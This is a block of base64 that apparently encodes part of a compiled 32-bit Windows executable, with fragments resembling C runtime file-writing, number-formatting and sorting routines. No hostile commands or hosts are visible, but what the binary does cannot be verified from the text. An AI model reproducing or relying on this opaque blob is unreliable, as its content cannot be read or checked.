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8NzBIsW6wIz0ouFtPj//4PuBMHqHwPAC9CJlI0w/v//SYP5/3QIi50s/v//67SLtaT4//+D/wFzC41GAYmFLP7//+sGibUs/v//uzQEAACNhZD6//8rnbj4//+L+8HvBYv3weYCVmoAUOjRJv//g+MfM8BAi8vT4ImENZD6//+NRwG7zAEAAImFjPr//4mFXPz//8HgAlCNhZD6//9QjYVg/P//U1Do98j//4PEHIuFmPj//zPSagpZiY2k+P//hcAPiFQEAAD38YmFkPj//4vKiY18+P//hcAPhGIDAACD+CZ2A2omWA+2DIVurEEAD7Y0hW+sQQCL+YmFsPj//8HnAleNBDGJhYz6//+NhZD6//9qAFDoJSb//4vGweACUIuFsPj//w+3BIVsrEEAjQSFaKNBAFCNhZD6//8Dx1DomzH//4u9jPr//4PEGIP/AXdyi72Q+v//hf91EzPAiYW8+P//iYVc/P//6ZYCAACD/wEPhKUCAACDvVz8//8AD4SYAgAAi4Vc/P//M8kz9ovYi8f3pLVg/P//A8GJhLVg/P//g9IARovKO/N15OmwAAAAiYyFYPz///+FXPz//+lZAgAAg71c/P//AQ+HxwAAAIu1YPz//4vHweACUI2FkPr//4m1qPj//1CNhWD8//+JvVz8//9TUOilx///g8QQhfZ1GjPAiYWM+v//iYVc/P//UI2FkPr//+nuAQAAg/4BD4T2AQAAg71c/P//AA+E6QEAAIuFXPz//zPJi72o+P//M/aL2IvH96S1YPz//wPBiYS1YPz//4PSAEaLyjvzdeS7zAEAAIXJD4SuAQAAi4Vc/P//g/hzD4I0////M8CJhYz6//+JhVz8//9QjYWQ+v//6egBAAA7vVz8//+NlZD6//8PksByBo2VYPz//4mVuPj//42NYPz//4TAdQaNjZD6//+JjbT4//+EwHQKi8+JvaD4///rDIuNXPz//4mNoPj//4TAdAaLvVz8//8zwDP2iYW8+P//hckPhPsAAACDPLIAdR478A+F5AAAAIOktcD4//8AjUYBiYW8+P//6c4AAAAz0ovOIZWs+P//iZWc+P//hf8PhKEAAACD+XN0ZDvIdReLhaz4//+DpI3A+P//AEADxomFvPj//4uFrPj//4uVtPj//4sEgouVuPj///cksgOFnPj//4PSAAGEjcD4//+Lhaz4//+D0gBAQYmFrPj//zvHiZWc+P//i4W8+P//dZeF0nQ0g/lzD4S4AAAAO8h1EYOkjcD4//8AjUEBiYW8+P//i8Iz0gGEjcD4//+Lhbz4//8T0kHryIP5cw+EhAAAAIuNoPj//4uVuPj//0Y78Q+FBf///4mFXPz//8HgAlCNhcD4//9QjYVg/P//U1DoiMX//4PEELABhMB0couFkPj//yuFsPj//4mFkPj//w+FpPz//4uNfPj//4XJD4QIBQAAiwSNBK1BAImFfPj//4XAdV0zwImFnPb//4mFXPz//1DrOjPAiYWc9v//iYVc/P//UI2FoPb//1CNhWD8//9TUOgUxf//g8QQMsDrioOlnPb//wCDpVz8//8AagCNhaD2//9QjYVg/P//6ZAEAACD+AEPhJEEAACLjVz8//+FyQ+EgwQAADP/M/b3pLVg/P//A8eJhLVg/P//i4V8+P//g9IARov6O/F14IX/D4RXBAAAi4Vc/P//g/hzD4NR////ibyFYPz///+FXPz//+k2BAAA99j38YmFoPj//4vKiY2M+P//hcAPhEEDAACD+CZ2A2omWA+2DIVurEEAD7Y0hW+sQQCL+YmFuPj//8HnAleNBDGJhYz6//+NhZD6//9qAFDozyH//4vGweACUIuFuPj//w+3BIVsrEEAjQSFaKNBAFCNhZD6//8Dx1DoRS3//4u9jPr//4PEGIP/AQ+HkAAAAIu9kPr//4X/dRozwImFnPb//4mFLP7//1CNhaD2///pbQIAAIP/AQ+EdQIAAIO9LP7//wAPhGgCAACLhSz+//8zyTP2i9iLx/ektTD+//8DwYmEtTD+//+D0gBGi8o783Xku8wBAACFyQ+EMwIAAIuFLP7//4P4cw+DwgIAAImMhTD+////hSz+///pEgIAAIO9LP7//wEPh4AAAACLtTD+//+Lx8HgAlCNhZD6//+JtXz4//9QjYUw/v//ib0s/v//U1DoLcP//4PEEIX2D4Q2////g/4BD4TFAQAAg70s/v//AA+EuAEAAIuFLP7//zPJi718+P//M/aL2IvH96S1MP7//wPBiYS1MP7//4PSAEaLyjvzdeTpRf///zu9LP7//42VkPr//w+SwHIGjZUw/v//iZWw+P//jY0w/v//hMB1Bo2NkPr//4mNkPj//4TAdAqLz4m9nPj//+sMi40s/v//iY2c+P//hMB0Bou9LP7//zPAM/aJhbz4//+FyQ+E+wAAAIM8sgB1HjvwD4XkAAAAg6S1wPj//wCNRgGJhbz4///pzgAAADPSi84hlaz4//+JlbT4//+F/w+EoQAAAIP5c3RkO8h1F4uFrPj//4OkjcD4//8AQAPGiYW8+P//i4Ws+P//i5WQ+P//iwSCi5Ww+P//9ySyA4W0+P//g9IAAYSNwPj//4uFrPj//4PSAEBBiYWs+P//O8eJlbT4//+Lhbz4//91l4XSdDSD+XMPhAgBAAA7yHURg6SNwPj//wCNQQGJhbz4//+LwjPSAYSNwPj//4uFvPj//xPSQevIg/lzD4TUAAAAi42c+P//i5Ww+P//RjvxD4UF////iYUs/v//weACUI2FwPj//1CNhTD+//9TUOhXwf//g8QQsAGEwA+EwQAAAIuFoPj//yuFuPj//4mFoPj//w+Fxfz//4uNjPj//4XJD4TTAAAAiwSNBK1BAImFjPj//4XAD4SYAAAAg/gBD4S1AAAAi40s/v//hckPhKcAAAAz/zP296S1MP7//wPHiYS1MP7//4uFjPj//4PSAEaL+jvxdeCF/3R/i4Us/v//g/hzc06JvIUw/v///4Us/v//62UzwFCJhZz2//+JhSz+//+NhaD2//9QjYUw/v//U1Dok8D//4PEEDLA6Tf///+DpZz2//8Ag6Us/v//AGoA6w8zwFCJhSz+//+JhZz2//+NhaD2//9QjYUw/v//U1DoVMD//4PEEIu9lPj//4v3i40s/v//ibWw+P//hcl0fGoKM/Yz/1uLhL0w/v//9+MDxomEvTD+//+D0gBHi/I7+XXkibWM+P//hfaLtbD4//+7zAEAAHRCi40s/v//g/lzcxGLwomEjTD+////hSz+///rJjPAUImFnPb//4mFLP7//42FoPb//1CNhTD+//9TUOjCv///g8QQi/6NhVz8//9QjYUs/v//UOhH6v//WVmD+AoPhZYAAAD/hZj4//+NdwGLhVz8///GBzGJtbD4//+FwA+EigAAAGoKM/+L8DPJW4uEjWD8///34wPHiYSNYPz//4PSAEGL+jvOdeSLtbD4//+7zAEAAIX/dFaLhVz8//+D+HNzD4m8hWD8////hVz8///rPDPAUImFnPb//4mFXPz//42FoPb//1CNhWD8//9TUOgOv///g8QQ6xSFwHUJi4WY+P//SOsNBDCNdwGIB4uFmPj//4uNgPj//4lBBIuNhPj//4XAeAqB+f///393AgPIi0UcSDvBcgKLwQOFlPj//4mFhPj//zvwD4TMAAAAi4Us/v//hcAPhL4AAAAz/4vYM8mLhI0w/v//ugDKmjv34gPHiYSNMP7//4PSAEGL+jvLdd+7zAEAAIX/dECLhSz+//+D+HNzD4m8hTD+////hSz+///rJjPAUImFnPb//4mFLP7//42FoPb//1CNhTD+//9TUOg5vv//g8QQjYVc/P//UI2FLP7//1DowOj//1lZi42E+P//aghfK84z0ve1pPj//4DCMDvPcgOIFDdPg///deiD+Ql2A2oJWQPxO7WE+P//D4U0////xgYAgL10+P//AF9eW3QNjYVs+P//UOi1FQAAWYtN/DPN6D8M///Jw2hIrUEA6wxoQK1BAOsFaDitQQD/dRyLjZT4//9R6ER9//+DxAyFwHUJ67BoMK1BAOvhM8BQUFBQUOgeiv//zIv/VYvsV/91DOi0rP//WYtNDIv4i0kMkPbBBnUf6KiK///HAAkAAACLRQxqEFmDwAzwCQiDyP/p1gAAAItFDItADJDB6AyoAXQN6HuK///HACIAAADr0YtFDItADJCoAXQo/3UM6F4DAABZi00Mg2EIAITAi0UMdLKLSASJCItFDGr+WYPADPAhCItFDFNqAluDwAzwCRiLRQxq91mDwAzwIQiLRQyDYAgAi0UMi0AMkKnABAAAdTNWi3UMagHoyEP//1k78HQOi3UMU+i6Q///WTvwdQtX6IcDAABZhcB1Cf91DOhSFwAAWV7/dQyLXQhT6DcBAABZWYTAdRGLRQxqEFmDwAzwCQiDyP/rAw+2w1tfXcOL/1WL7Ff/dQzon6v//1mLTQyL+ItJDJD2wQZ1IeiTif//xwAJAAAAi0UMahBZg8AM8AkIuP//AADp2AAAAItFDItADJDB6AyoAXQN6GSJ///HACIAAADrz4tFDItADJCoAXQo/3UM6EcCAABZi00Mg2EIAITAi0UMdLCLSASJCItFDGr+WYPADPAhCItFDFNWagJbg8AM8AkYi0UMavdZg8AM8CEIi0UMg2AIAItFDItADJCpwAQAAHUxi3UMagHosUL//1k78HQOi3UMU+ijQv//WTvwdQtX6HACAABZhcB1Cf91DOg7FgAAWf91DIt1CFbo7QAAAFlZhMB1E4tFDGoQWYPADPAJCLj//wAA6wMPt8ZeW19dw4v/VYvsVlf/dQzohar//1mLTQyL0ItJDJD2wcAPhJAAAACLTQwz/4tBBIsxK/BAiQGLRQyLSBhJiUgIhfZ+JItFDFb/cARS6JHf//+DxAyL+ItFDDv+i0gEikUIiAEPlMDrZYP6/3Qbg/r+dBaLwovKg+A/wfkGa8A4AwSNyPFBAOsFuPjgQQD2QCggdMNqAldXUuh3EAAAI8KDxBCD+P91r4tFDGoQWYPADPAJCLAB6xZqAY1FCFBS6B/f//+DxAxI99gawP7AX15dw4v/VYvsVlf/dQzouan//1mLTQyL0ItJDJD2wcAPhJMAAACLTQwz/4tBBIsxK/CDwAKJAYtFDItIGIPpAolICIX2fiOLRQxW/3AEUujB3v//g8QMi/iLRQw7/otIBGaLRQhmiQHrYYP6/3Qbg/r+dBaLwovKg+A/wfkGa8A4AwSNyPFBAOsFuPjgQQD2QCggdMRqAldXUuioDwAAI8KDxBCD+P91sItFDGoQWYPADPAJCLAB6xVqAo1FCFBS6FDe//+DxAyD+AIPlMBfXl3Di/9Vi+yLRQiD7BCLQAyQwegDqAF0BLABycOLRQhTVotADJCowItFCHQHiwg7SAR0TotAEJBQ6LXA//+L8FmD/v90PDPbjUX4Q1NQagBqAFb/FWRgQQCFwHQljUXwUFb/FWBgQQCFwHQWi0X4O0XwdQiLRfw7RfR0AjLbisPrAjLAXlvJw4v/VYvsXemo+///i/9Vi+xd6bL8//+L/1WL7ItNCIP5/nUN6FWG///HAAkAAADrOIXJeCQ7DcjzQQBzHIvBg+E/wfgGa8k4iwSFyPFBAA+2RAgog+BAXcPoIIb//8cACQAAAOhYhf//M8Bdw4v/VYvsUVGLVQxWi3UQD7fKV4X2dQW+HPRBAIM+AI2BACQAAA+3wHU8v/8DAABmO8d3CVboOeL//1nrWo2CACgAAGY7x3cSgeH/J///g8FAweEKM8CJDus9VlH/dQjoLuL//+suuf8DAABmO8F3xI1F+DP/UA+3wiX/I///iX34AwZQ/3UIiX386APi//+JPol+BIPEDF9eycPMzMzMzMzMzMzMzIv/VYvsi0UMV4t9CDv4dCZWi3UQhfZ0HSv4jZsAAAAAigiNQAGKVAf/iEwH/4hQ/4PuAXXrXl9dw8zMzMzMzMyL/1WL7IHsHAEAAKEE4EEAM8WJRfyLTQxTi10UVot1CIm1/P7//4md+P7//1eLfRCJvQD///+F9nUlhcl0IejphP//xwAWAAAA6CGE//+LTfxfXjPNW+gFBv//i+Vdw4X/dNuF23TXx4X0/v//AAAAAIP5AnLYSQ+vzwPOiY0E////i8Ez0ivG9/eNeAGD/wgPh9wAAACLvQD///87zg+GoQAAAI0UN4mV7P7//41JAIvGi/KJhQj///878Xcxi/9QVovL/xWoYUEA/9ODxAiFwH4Ki8aJhQj////rBouFCP///4uNBP///wP3O/F20YvRO8F0NCvBi9+JhQj///+QigwQjVIBi7UI////ikL/iEQW/4vGiEr/g+sBdeOLnfj+//+LjQT///+Ltfz+//8rz4uV7P7//4mNBP///zvOD4dr////i430/v//i8FJiY30/v//hcAPjvL+//+LdI2Ei4yNDP///4m1/P7//+kK////i7UA////i8uLhfz+///R7w+v/gP4V1D/FahhQQD/04PECIXAfhBWV/+1/P7//+gb/v//g8QM/7UE////i8v/tfz+////FahhQQD/04PECIXAfhVW/7UE/////7X8/v//6On9//+DxAz/tQT///+Ly1f/Fahh